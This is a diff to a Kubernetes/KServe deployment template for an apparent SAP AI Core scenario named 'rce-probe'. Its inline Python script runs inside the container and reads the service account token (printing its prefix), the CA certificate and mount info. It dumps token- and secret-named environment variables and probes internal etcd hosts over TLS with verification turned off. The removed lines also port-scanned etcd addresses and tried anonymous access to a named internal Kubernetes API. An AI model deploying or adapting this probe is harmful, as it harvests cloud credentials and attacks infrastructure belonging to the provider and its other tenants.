@@ -7,7 +7,7 @@ metadata:
     ai.sap.com/version: "4.17.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "sa-token-diag-mountinfo-etcd-tls"
+    executables.ai.sap.com/description: "sa-token-diag-altpath-mountinfo"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -40,33 +40,18 @@ spec:
                     apiVersion: v1
                     fieldPath: metadata.namespace
                   path: namespace
-        - name: kube-api-access-alt
-          projected:
-            defaultMode: 420
-            sources:
-            - serviceAccountToken:
-                expirationSeconds: 3600
-                path: token
-            - configMap:
-                items:
-                - key: ca.crt
-                  path: ca.crt
-                name: kube-root-ca.crt
         containers:
         - name: kserve-container
           image: python:3.11
           command: ["/bin/sh", "-c"]
           volumeMounts:
-          - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
+          - mountPath: /tmp/sa-diag
             name: kube-api-access
-            readOnly: true
-          - mountPath: /tmp/sa-alt
-            name: kube-api-access-alt
             readOnly: true
           args:
           - |
             python3 -c "
-            import os, socket, ssl, struct, base64, json, select, subprocess, time
+            import os, socket, ssl, json, select, struct
 
             print('[PROBE_V417_START]', flush=True)
 
@@ -75,111 +60,59 @@ spec:
                 for i in range(0, max(1, len(flat)), 4000):
                     print(f'[{label}_{i}] {flat[i:i+4000]}', flush=True)
 
-            # ── 1. SA token diagnostics ───────────────────────────────────────────
+            # ── 1. Check alternative mount path /tmp/sa-diag ─────────────────────
             for path in [
+                '/tmp/sa-diag',
                 '/var/run/secrets/kubernetes.io/serviceaccount',
                 '/var/run/secrets/kubernetes.io',
                 '/var/run/secrets',
                 '/run/secrets',
-                '/tmp/sa-alt',
             ]:
                 try:
                     contents = os.listdir(path)
                     emit(f'DIR_{path.replace(\"/\",\"_\")}', str(contents))
+                    for f in contents:
+                        try:
+                            with open(f'{path}/{f}') as fh:
+                                d = fh.read(400)
+                            label = f'{path.replace(\"/\",\"_\")}_{f.replace(\".\",\"_\")}'
+                            emit(f'FILE_{label}', d if f != 'token' else f'len={len(d)} pre={d[:60]}')
+                        except Exception as e2:
+                            emit(f'FILE_ERR_{path.replace(\"/\",\"_\")}_{f}', str(e2))
                 except Exception as e:
                     emit(f'DIR_MISS_{path.replace(\"/\",\"_\")}', str(e))
 
-            # ── 2. Read mountinfo ─────────────────────────────────────────────────
+            # ── 2. /proc/self/mountinfo ───────────────────────────────────────────
             try:
                 with open('/proc/self/mountinfo') as f:
                     emit('MOUNTINFO', f.read())
             except Exception as e:
                 emit('MOUNTINFO_ERR', str(e))
 
-            # ── 3. Check environment for tokens/secrets ───────────────────────────
-            env_relevant = {k:v for k,v in os.environ.items()
-                            if any(x in k.upper() for x in ['TOKEN','SECRET','KUBE','K8S','SA_'])}
-            emit('ENV_RELEVANT', str(env_relevant))
-            emit('ENV_KUBERNETES_HOST', os.environ.get('KUBERNETES_SERVICE_HOST','missing'))
+            # ── 3. Environment variables (K8s-related) ────────────────────────────
+            relevant_env = {k: v for k, v in os.environ.items()
+                            if any(x in k.upper() for x in
+                                   ['TOKEN','SECRET','KUBE','K8S','SA_','SERVICE_ACCOUNT'])}
+            emit('ENV_K8S', str(relevant_env))
 
-            # ── 4. Try reading each file in the projected volume ──────────────────
-            for fname in ['token','ca.crt','namespace']:
-                for base in ['/var/run/secrets/kubernetes.io/serviceaccount', '/tmp/sa-alt']:
-                    fpath = f'{base}/{fname}'
-                    try:
-                        with open(fpath) as f:
-                            data = f.read(500)
-                        emit(f'FILE_{base.replace(\"/\",\"_\")}_{fname.replace(\".\",\"_\")}',
-                             data if fname != 'token' else f'len={len(data)} prefix={data[:60]}')
-                    except Exception as e:
-                        emit(f'FILE_MISS_{base.replace(\"/\",\"_\")}_{fname.replace(\".\",\"_\")}', str(e))
-
-            # ── 5. Etcd WITH TLS (for comparison with v4.14.0 SSL-EOF result) ─────
-            def http_raw_tls(host, port, path, timeout=10):
+            # ── 4. Etcd TLS (for comparison with v4.14.0) ────────────────────────
+            for sip in ['10.250.0.1','10.250.0.2','10.250.0.3']:
                 try:
-                    s = socket.socket(); s.settimeout(timeout)
+                    s = socket.socket(); s.settimeout(10)
                     ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                     ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
-                    s = ctx.wrap_socket(s, server_hostname=host)
-                    s.connect((host, port))
-                    req = f'GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\n\r\n'
-                    s.sendall(req.encode())
+                    s = ctx.wrap_socket(s, server_hostname=sip)
+                    s.connect((sip, 2379))
+                    s.sendall(b'GET /health HTTP/1.1\r\nHost: ' + sip.encode() + b':2379\r\nConnection: close\r\n\r\n')
                     resp = b''
                     while True:
                         c = s.recv(4096)
                         if not c: break
                         resp += c
                     s.close()
-                    return resp.decode(errors='replace')
-                except Exception as ex:
-                    return f'ERR:{ex}'
-
-            print('[ETCD_TLS_START]', flush=True)
-            for sip in ['10.250.0.1', '10.250.0.2', '10.250.0.3']:
-                r = http_raw_tls(sip, 2379, '/health')
-                emit(f'ETCD_TLS_{sip}', r[:400])
-
-            # ── 6. Scan broader seed cluster range ────────────────────────────────
-            print('[ETCD_SCAN_START]', flush=True)
-            for last in range(1, 20):
-                sip = f'10.250.0.{last}'
-                try:
-                    s = socket.socket(); s.settimeout(3)
-                    s.connect((sip, 2379))
-                    s.close()
-                    emit(f'ETCD_TCP_OPEN_{sip}', 'OPEN')
+                    emit(f'ETCD_TLS_{sip}', resp[:300].decode(errors='replace'))
                 except Exception as e:
-                    emit(f'ETCD_TCP_{sip}', str(e)[:80])
-
-            # ── 7. Attempt K8s API without any token (baseline anon-auth check) ───
-            K8S = 'api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com'
-            def http_raw(host, port, path, method='GET', headers=None, body=b'',
-                         timeout=10, use_tls=False):
-                try:
-                    s = socket.socket(); s.settimeout(timeout)
-                    if use_tls:
-                        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
-                        s = ctx.wrap_socket(s, server_hostname=host)
-                    s.connect((host, port))
-                    hdr_str = ''.join(f'{k}: {v}\r\n' for k,v in (headers or {}).items())
-                    req = f'{method} {path} HTTP/1.1\r\nHost: {host}:{port}\r\nConnection: close\r\n{hdr_str}\r\n'
-                    s.sendall(req.encode() + (body if isinstance(body,bytes) else body.encode()))
-                    resp = b''
-                    while True:
-                        c = s.recv(65536)
-                        if not c: break
-                        resp += c
-                    s.close()
-                    return resp.decode(errors='replace')
-                except Exception as ex:
-                    return f'ERR:{ex}'
-
-            r = http_raw(K8S, 443, '/version', use_tls=True, timeout=10)
-            emit('K8S_ANON_VERSION', r[:500])
-
-            r = http_raw(K8S, 443, '/api/v1/namespaces', use_tls=True, timeout=10)
-            emit('K8S_ANON_NS', r[:500])
+                    emit(f'ETCD_TLS_ERR_{sip}', str(e))
 
             print('[PROBE_V417_DONE]', flush=True)
             " 2>&1
